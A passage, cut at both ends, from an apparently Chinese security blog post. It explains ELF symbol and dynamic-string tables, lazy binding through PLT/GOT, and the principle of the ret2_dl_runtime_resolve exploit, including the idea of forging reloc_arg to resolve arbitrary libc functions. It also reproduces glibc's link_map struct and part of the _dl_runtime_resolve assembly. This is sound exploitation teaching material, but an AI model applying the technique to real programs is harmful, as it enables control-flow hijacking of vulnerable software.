style="text-align:center">0xFFF1</td><td style="text-align:left">此节中所定义的符号有绝对的值,这个值不会因重定位而改变。</td></tr><tr><td style="text-align:left">SHN_COMMON</td><td style="text-align:center">0xFFF2</td><td style="text-align:left">相对于这个节定义的符号是公共符号，例如FORTRAN的COMMON块或未分配的C外部变量。这些符号有时被称为暂定符号。表示该符号是一个”COMMON块”的符号，一般来说，未初始化的全局符号定义就是这种类型的。</td></tr><tr><td style="text-align:left">SHN_XINDEX</td><td style="text-align:center">0xFFFF</td><td style="text-align:left">溢出值，指示实际的节头索引太大，所以存储在别处。当节头项中e_shstrndx的值是SHN_XINDEX时，表明真实的节头表索引值存储在第一个节头表表项(即节头表索引值为0)的成员sh_link中。</td></tr><tr><td style="text-align:left">SHN_HIRESERVE</td><td style="text-align:center">0xFFFF</td><td style="text-align:left">被保留索引号区间的上限。</td></tr></tbody></table><p>&emsp;&emsp;<strong><code>st_info</code></strong>指定<code>符号类型</code>及<code>绑定属性</code>。st_info的<strong><code>低四位</code></strong>表示<code>符号类型</code>，<strong><code>高四位</code></strong>表示<code>绑定属性</code>。符号类型以<code>STT</code>开头，符号绑定以<code>STB</code>开头，下面对几种常见的符号类型和符号绑定进行介绍。</p><p>1、<strong><code>符号类型</code></strong></p><blockquote><ul><li><strong><code>STT_NOTYPE(0)</code></strong>：符号类型<code>未定义</code>。</li><li><strong><code>STT_OBJECT(1)</code></strong>：表示该符号与<code>数据目标文件</code>关联。</li><li><strong><code>STT_FUNC(2)</code></strong>：表示该符号与<code>函数</code>或者<code>其他可执行代码</code>关联。</li></ul></blockquote><p>2、<strong><code>绑定属性</code></strong></p><blockquote><ul><li><strong><code>STB_LOCAL(0)</code></strong>：<code>本地符号</code>在<code>目标文件</code>之外是不可见的，<code>目标文件</code>包含了<code>符号的定义</code>，如一个声明为static的函数。</li><li><strong><code>STB_GLOBAL(1)</code></strong>：<code>全局符号</code>对于所有<code>要合并的目标文件</code>来说都是可见的。一个全局符号在<code>一个文件</code>中进行定义后，<code>另外一个文件</code>可以对这个符号进行引用。</li><li><strong><code>STB_WEAK(2)</code></strong>：与<code>全局绑定</code>类似，不过比<code>STB_GLOBAL</code>的<code>优先级低</code>。<code>被标记</code>为<code>STB_WEAK</code>的符号有可能会被<code>同名</code>的<code>未被标记</code>为<code>STB_WEAK</code>的符号<code>覆盖</code>。</li></ul></blockquote><h3 id="2-6、“-dynstr”节"><a href="#2-6、“-dynstr”节" class="headerlink" title="2.6、“.dynstr”节"></a>2.6、“.dynstr”节</h3><p>&emsp;&emsp;<strong><code>“.dynstr”</code></strong>是<code>动态链接字符串表</code>。其<code>第一个字节</code>为0，然后包含<code>动态链接</code>所需的字符串(导入函数名等)(<code>以\x00结尾</code>)。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.dynstr:08048260 _dynstr segment byte public &apos;&apos; use32</span><br><span class="line">.dynstr:08048260         assume cs:_dynstr</span><br><span class="line">.dynstr:08048260         ;org 8048260h</span><br><span class="line">.dynstr:08048260         assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing</span><br><span class="line">.dynstr:08048260 byte_8048260    db 0             </span><br><span class="line">.dynstr:08048261 aGmonStart      db &apos;__gmon_start__&apos;,0   </span><br><span class="line">.dynstr:08048270 aLibcSo6        db &apos;libc.so.6&apos;,0</span><br><span class="line">.dynstr:0804827A aIoStdinUsed    db &apos;_IO_stdin_used&apos;,0   </span><br><span class="line">.dynstr:08048289 aStrncmp        db &apos;strncmp&apos;,0          </span><br><span class="line">.dynstr:08048291 aStrlen         db &apos;strlen&apos;,0           </span><br><span class="line">.dynstr:08048298 aRead           db &apos;read&apos;,0             </span><br><span class="line">.dynstr:0804829D aLibcStartMain  db &apos;__libc_start_main&apos;,0 </span><br><span class="line">.dynstr:080482AF aWrite          db &apos;write&apos;,0            </span><br><span class="line">.dynstr:080482B5 aGlibc20        db &apos;GLIBC_2.0&apos;,0</span><br><span class="line">.dynstr:080482BF                 align 10h</span><br><span class="line">.dynstr:080482BF _dynstr ends</span><br></pre></td></tr></table></figure></p><h2 id="3、ret2-dl-runtime-resolve利用原理"><a href="#3、ret2-dl-runtime-resolve利用原理" class="headerlink" title="3、ret2_dl_runtime_resolve利用原理"></a>3、ret2_dl_runtime_resolve利用原理</h2><h3 id="3-1、函数调用流程"><a href="#3-1、函数调用流程" class="headerlink" title="3.1、函数调用流程"></a>3.1、函数调用流程</h3><p>&emsp;&emsp;动态链接下<code>第一次调用</code>glibc的函数需要通过<code>PLT表</code>中的一段代码<code>解析函数的真实地址</code>，这也是ELF的<code>延迟绑定</code>的特点。具体的解析方式就是通过调用<strong><code>_dl_runtime_resolve(link_map_obj, reloc_arg)</code></strong> ，如果我们可以<code>控制</code>整个解析过程中的<code>参数</code>，那么就能解析<code>我们想要的函数地址</code>。以调用<code>printf函数</code>为例，回顾一下整个流程：</p><blockquote><ul><li>1、<strong><code>call printf@PLT</code></strong></li><li>2、<strong><code>jmp *(printf@GOT)</code></strong> -&gt; (第一次会jmp回来，解析之后就直接jmp到解析出来的地址了) -&gt; <strong><code>push n</code></strong> -&gt; <strong><code>jmp &amp;PLT[0]</code></strong> (跳到公共表项)</li><li>3、<strong><code>push GOT[1]</code></strong> (link_map可以理解为模块ID) -&gt; <strong><code>jmp *GOT[2]</code></strong> (跳转到_dl_runtime_resolve函数)<br>以上步骤相当于调用了<strong><code>_dl_runtime_resolve(link_map_obj, reloc_arg)</code></strong></li><li>4、<strong><code>解析完毕</code></strong>后会把解析出来的地址<code>写回</code>通过reloc_arg定位到的<code>.rel.plt表项的r_offset指向的位置</code>(其实就是<code>.got.plt</code>表中的对应项)</li></ul></blockquote><p>&emsp;&emsp;弄懂<code>_dl_runtime_resolve()</code>的解析过程后，就可以通过<code>伪造reloc_arg</code>来解析出<code>我们想要的libc函数地址</code>并且<code>写回可控区域</code>了。</p><h3 id="3-2、-dl-runtime-resolve-link-map-obj-reloc-arg-解析流程"><a href="#3-2、-dl-runtime-resolve-link-map-obj-reloc-arg-解析流程" class="headerlink" title="3.2、_dl_runtime_resolve(link_map_obj, reloc_arg)解析流程"></a>3.2、_dl_runtime_resolve(link_map_obj, reloc_arg)解析流程</h3><blockquote><ul><li>1、通过<code>link_map_obj</code>访问<strong><code>“.dynamic”节</code></strong>，分别取出<code>动态链接字符串表“.dynstr”</code>、<code>动态链接符号表“.dynsym”</code>、<code>重定位表“.rel.plt”的地址</code>。记为<strong><code>dynstr_addr</code></strong>、<strong><code>dynsym_addr</code></strong>、<strong><code>rel_plt_addr</code></strong>。</li><li>2、利用<strong><code>rel_plt_addr + reloc_index</code></strong>，求出<code>当前函数</code>重定位表项Elf32_Rel的指针，记为<strong><code>rel</code></strong>。</li><li>3、<code>rel-&gt;r_info</code>的<code>高24位</code>作为<code>动态链接符号表“.dynsym”</code>的下标，即利用<strong><code>dynsym_addr + ((rel-&gt;r_info)&gt;&gt;8)</code></strong>，求出<code>当前函数</code>动态链接符号表项Elf32_Sym的指针，记作<strong><code>sym</code></strong>。</li><li>4、<code>sym -&gt; st_name</code>作为<code>动态链接字符串表“.dynstr”</code>的下标，即利用<strong><code>dynstr_addr + (sym -&gt; st_name)</code></strong>，求出<code>当前函数</code>动态链接字符串表项在的指针，记作<strong><code>str</code></strong>。</li><li>5、在<code>动态链接库</code>查找这个函数的地址，并且把<code>找到的地址</code>赋值给<strong><code>rel-&gt;r_offset</code></strong>指向存储单元，即<strong><code>.got.plt</code></strong>中此函数的对应项。</li><li>6、最后<code>调用这个函数</code>。</li></ul></blockquote><h4 id="3-2-0、link-map结构体定义"><a href="#3-2-0、link-map结构体定义" class="headerlink" title="3.2.0、link_map结构体定义"></a>3.2.0、link_map结构体定义</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;link_map.h&gt;</span></span></span><br><span class="line"><span class="comment">/* 描述加载的共享库的结构体。“l_next”和“l_prev”成员构成了启动时加载的所有共享对象的链表。</span></span><br><span class="line"><span class="comment">   这些数据结构存在于运行时动态链接器使用的空间中。 修改它们可能会导致灾难性的后果。 如有</span></span><br><span class="line"><span class="comment">   必要，此数据结构将来可能会更改。 用户级程序必须避免定义这种类型的对象。 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> &#123;</span></span><br><span class="line">    <span class="comment">/* 这些最初的几个成员是调试器协议的一部分。 这与SVR4中使用的格式相同。 */</span></span><br><span class="line">    ElfW(Addr) l_addr;  <span class="comment">/* ELF文件中的地址与内存中的地址之间的不同。共享文件加载基地址。 */</span></span><br><span class="line">    <span class="keyword">char</span> *l_name;       <span class="comment">/* 绝对文件名 */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;    <span class="comment">/* 共享对象的动态节 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span>  <span class="comment">/* 加载的共享对象链表指针 */</span></span><br><span class="line">    <span class="comment">/* 以下所有成员都是动态链接器的内部组件，可能随时改变不受提醒 */</span></span><br><span class="line">    <span class="comment">/* 当在多个名称空间中使用ld.so时，该元素与指向该类型的相同副本的指针不同。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_real</span>;</span></span><br><span class="line">    <span class="comment">/* 该link map所属的命名空间个数 */</span></span><br><span class="line">    Lmid_t l_ns;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">libname_list</span> *<span class="title">l_libname</span>;</span></span><br><span class="line">    <span class="comment">/* 指向“.dynamic”节的索引指针。</span></span><br><span class="line"><span class="comment">    这个数组用于快速访问动态节的信息，在lookup系列函数中会频繁使用。</span></span><br><span class="line"><span class="comment">    它的有关定义还包含了一系列用于访问信息的功能宏。 */</span></span><br><span class="line">    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM</span><br><span class="line">                    + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Phdr)</span> *l_phdr</span>;  <span class="comment">/* 指向程序头表的指针。 */</span></span><br><span class="line">    ElfW(Addr) l_entry;        <span class="comment">/* 入口点位置。 */</span></span><br><span class="line">    ElfW(Half) l_phnum;        <span class="comment">/* 程序头条目的数量。 */</span></span><br><span class="line">    ElfW(Half) l_ldnum;        <span class="comment">/* dynamic节条目数量 */</span></span><br><span class="line">    <span class="comment">/* DT_NEEDED依存项及其依存项的数组，按依赖关系查找符号（包含和不包含重复项）。 在加载依赖项之前，没有任何条目。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> <span class="title">l_searchlist</span>;</span></span><br><span class="line">    <span class="comment">/* 我们需要一个特殊的搜索列表来处理标记有DT_SYMBOLIC的对象。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> <span class="title">l_symbolic_searchlist</span>;</span></span><br><span class="line">    <span class="comment">/* 第一次导致该对象被加载的对象。  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_loader</span>;</span></span><br><span class="line">    <span class="comment">/* 版本名称的数组。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">l_versions</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_nversions;</span><br><span class="line">    <span class="comment">/* 符号Hash表 */</span></span><br><span class="line">    Elf_Symndx l_nbuckets;</span><br><span class="line">    Elf32_Word l_gnu_bitmask_idxbits;</span><br><span class="line">    Elf32_Word l_gnu_shift;</span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Addr)</span> *l_gnu_bitmask</span>;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> Elf32_Word *l_gnu_buckets;</span><br><span class="line">        <span class="keyword">const</span> Elf_Symndx *l_chain;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> Elf32_Word *l_gnu_chain_zero;</span><br><span class="line">        <span class="keyword">const</span> Elf_Symndx *l_buckets;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_direct_opencount; <span class="comment">/* dlopen/dlclose的引用计数。  */</span></span><br><span class="line">    <span class="keyword">enum</span> &#123;                    <span class="comment">/* 该对象来自何处。 */</span></span><br><span class="line">        lt_executable,        <span class="comment">/* 主要的可执行程序。 */</span></span><br><span class="line">        lt_library,           <span class="comment">/* 主可执行文件需要的库。 */</span></span><br><span class="line">        lt_loaded             <span class="comment">/* 额外的运行时加载的共享库。 */</span></span><br><span class="line">    &#125; l_type:<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_relocated:<span class="number">1</span>;      <span class="comment">/* 如果对象的重定位完成，则为非零值。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_init_called:<span class="number">1</span>;    <span class="comment">/* 如果DT_INIT函数被调用，则为非零值。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_global:<span class="number">1</span>;         <span class="comment">/* 如果对象在_dl_global_scope中，则为非零值。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_reserved:<span class="number">2</span>;       <span class="comment">/* 保留供内部使用。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_phdr_allocated:<span class="number">1</span>; <span class="comment">/* 如果分配了由“ l_phdr”指向的数据结构，则为非零值。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_soname_added:<span class="number">1</span>;   <span class="comment">/* 如果确定SO_NAME在l_libname列表中，则为非零值。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_faked:<span class="number">1</span>;          <span class="comment">/* 如果这是一个没有关联文件的伪造描述符，则为非零值。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_need_tls_init:<span class="number">1</span>;  <span class="comment">/* 重定位完成后，如果在此link map上调用GL（dl_init_static_tls），则为非零值。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_auditing:<span class="number">1</span>;       <span class="comment">/* 如果DSO用于审计，则为非零值。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_audit_any_plt:<span class="number">1</span>;  <span class="comment">/* 如果至少一个审计模块对PLT拦截感兴趣，则为非零值。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_removed:<span class="number">1</span>;        <span class="comment">/* 如果该对象已被删除而无法再使用，则为非零值。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_contiguous:<span class="number">1</span>;     <span class="comment">/* 如果段间孔受到保护，或者根本不存在孔，则为非零值。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_symbolic_in_local_scope:<span class="number">1</span>; <span class="comment">/* 如果LD_TRACE_PRELINKING = 1期间的</span></span><br><span class="line"><span class="comment">                                                l_local_scope包含任何DT_SYMBOLIC库，则为非零值。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_free_initfini:<span class="number">1</span>; <span class="comment">/* 如果可以释放l_initfini，则为非零值。即，没有在ld.so中与虚拟malloc一起分配。 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 收集有关自己的RPATH目录的信息。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_search_path_struct</span> <span class="title">l_rpath_dirs</span>;</span></span><br><span class="line">    <span class="comment">/* 概要分析时收集的重定位结果。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">reloc_result</span> &#123;</span></span><br><span class="line">        DL_FIXUP_VALUE_TYPE addr;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">bound</span>;</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> boundndx;</span><br><span class="line">        <span class="keyword">uint32_t</span> enterexit;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">        <span class="comment">/* 并发性注：这用于保护跨多个线程的重定位结果的并发初始化。 请参阅elf/dl-runtime.c中的更详细说明。 */</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> init;</span><br><span class="line">    &#125; *l_reloc_result;</span><br><span class="line">    <span class="comment">/* 指向版本信息的指针（如果有）。 */</span></span><br><span class="line">    ElfW(Versym) *l_versyms;</span><br><span class="line">    <span class="comment">/* 字符串，指定找到此对象的路径。 */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *l_origin;</span><br><span class="line">    <span class="comment">/* 此对象的内存映射的开始和结束。 l_map_start不必与l_addr相同。 */</span></span><br><span class="line">    ElfW(Addr) l_map_start, l_map_end;</span><br><span class="line">    <span class="comment">/* 映射的可执行部分的结尾。 */</span></span><br><span class="line">    ElfW(Addr) l_text_end;</span><br><span class="line">    <span class="comment">/* “l_scope”的默认数组。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> *<span class="title">l_scope_mem</span>[4];</span></span><br><span class="line">    <span class="comment">/* 为“ l_scope”分配的数组大小。 */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_scope_max;</span><br><span class="line">    <span class="comment">/* 这是一个定义此link map的查找范围的数组。最初最多有三个不同的范围列表。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> **<span class="title">l_scope</span>;</span></span><br><span class="line">    <span class="comment">/* 类似的数组，这次仅与本地范围有关。偶尔使用。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> *<span class="title">l_local_scope</span>[2];</span></span><br><span class="line">    <span class="comment">/* 保留此信息以检查共享对象是否与已加载的对象相同。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_file_id</span> <span class="title">l_file_id</span>;</span></span><br><span class="line">    <span class="comment">/* 收集有关自己的RUNPATH目录的信息。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_search_path_struct</span> <span class="title">l_runpath_dirs</span>;</span></span><br><span class="line">    <span class="comment">/* 按init和fini调用的顺序列出对象。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> **<span class="title">l_initfini</span>;</span></span><br><span class="line">    <span class="comment">/* 通过符号绑定引入的依赖项列表。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map_reldeps</span> &#123;</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> act;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">list</span>[];</span></span><br><span class="line">    &#125; *l_reldeps;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_reldepsmax;</span><br><span class="line">    <span class="comment">/* 如果使用DSO，则为非零值。 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_used;</span><br><span class="line">    <span class="comment">/* 各种标志字。 */</span></span><br><span class="line">    ElfW(Word) l_feature_1;</span><br><span class="line">    ElfW(Word) l_flags_1;</span><br><span class="line">    ElfW(Word) l_flags;</span><br><span class="line">    <span class="comment">/* 暂时在dl_close中使用。 */</span></span><br><span class="line">    <span class="keyword">int</span> l_idx;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map_machine</span> <span class="title">l_mach</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym</span>;</span><br><span class="line">        <span class="keyword">int</span> type_class;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">value</span>;</span></span><br><span class="line">        <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *ret</span>;</span><br><span class="line">    &#125; l_lookup_cache;</span><br><span class="line">    <span class="comment">/* 线程本地存储相关信息。 */</span></span><br><span class="line">    <span class="comment">/* 初始化映像的开始。 */</span></span><br><span class="line">    <span class="keyword">void</span> *l_tls_initimage;</span><br><span class="line">    <span class="comment">/* 初始化映像的大小。 */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_initimage_size;</span><br><span class="line">    <span class="comment">/* TLS块的大小。 */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_blocksize;</span><br><span class="line">    <span class="comment">/* TLS块的对齐要求。 */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_align;</span><br><span class="line">    <span class="comment">/* 第一个字节模块对齐方式的偏移量。 */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_firstbyte_offset;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> NO_TLS_OFFSET</span></span><br><span class="line">    <span class="meta"># <span class="meta-keyword">define</span> NO_TLS_OFFSET        0</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> FORCED_DYNAMIC_TLS_OFFSET</span></span><br><span class="line">    <span class="meta"># <span class="meta-keyword">if</span> NO_TLS_OFFSET == 0</span></span><br><span class="line">    <span class="meta">#  <span class="meta-keyword">define</span> FORCED_DYNAMIC_TLS_OFFSET -1</span></span><br><span class="line">    <span class="meta"># <span class="meta-keyword">elif</span> NO_TLS_OFFSET == -1</span></span><br><span class="line">    <span class="meta">#  <span class="meta-keyword">define</span> FORCED_DYNAMIC_TLS_OFFSET -2</span></span><br><span class="line">    <span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="meta">#  <span class="meta-keyword">error</span> <span class="meta-string">"FORCED_DYNAMIC_TLS_OFFSET is not defined"</span></span></span><br><span class="line">    <span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">/* 对于启动时出现的对象：静态TLS块中的偏移量。 */</span></span><br><span class="line">    <span class="keyword">ptrdiff_t</span> l_tls_offset;</span><br><span class="line">    <span class="comment">/* dtv数组中模块的索引。 */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_modid;</span><br><span class="line">    <span class="comment">/* 此DSO构造的thread_local对象的数量。 这是原子访问和修改的，</span></span><br><span class="line"><span class="comment">    并不总是受加载锁保护。 另请参见：cxa_thread_atexit_impl.c中的“注意事项”。 */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_dtor_count;</span><br><span class="line">    <span class="comment">/* 重定位完成后用于更改权限的信息。 */</span></span><br><span class="line">    ElfW(Addr) l_relro_addr;</span><br><span class="line">    <span class="keyword">size_t</span> l_relro_size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> l_serial;</span><br><span class="line">    <span class="comment">/* 审计信息。 该数组显然必须是结构体中的最后一个。 切勿在其后添加任何内容。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">auditstate</span> &#123;</span></span><br><span class="line">        <span class="keyword">uintptr_t</span> cookie;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> bindflags;</span><br><span class="line">    &#125; l_audit[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="3-2-1、-dl-runtime-resolve-的内容"><a href="#3-2-1、-dl-runtime-resolve-的内容" class="headerlink" title="3.2.1、_dl_runtime_resolve()的内容"></a>3.2.1、_dl_runtime_resolve()的内容</h4><p>&emsp;&emsp;<strong><code>_dl_runtime_resolve()</code></strong>在<code>glibc-2.23/sysdeps/i386/dl-trampoline.S(64位把i386改为x86_64)</code>中使用<code>汇编</code>实现，其主要代码如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.text</span></span><br><span class="line"><span class="meta">.globl</span> _dl_runtime_resolve</span><br><span class="line"><span class="meta">.type</span> _dl_runtime_resolve, @function</span><br><span class="line">    cfi_startproc</span><br><span class="line"><span class="meta">.align</span> <span class="number">16</span></span><br><span class="line"><span class="symbol">_dl_runtime_resolve:</span></span><br><span class="line">    cfi_adjust_cfa_offset (<span class="number">8</span>)</span><br><span class="line">    _CET_ENDBR</span><br><span class="line">    pushl %eax  # Preserve registers otherwise clobbered.</span><br><span class="line">    cfi_adjust_cfa_offset (<span class="number">4</span>)</span><br><span class="line">    pushl %ecx</span><br><span class="line">    cfi_adjust_cfa_offset (<span 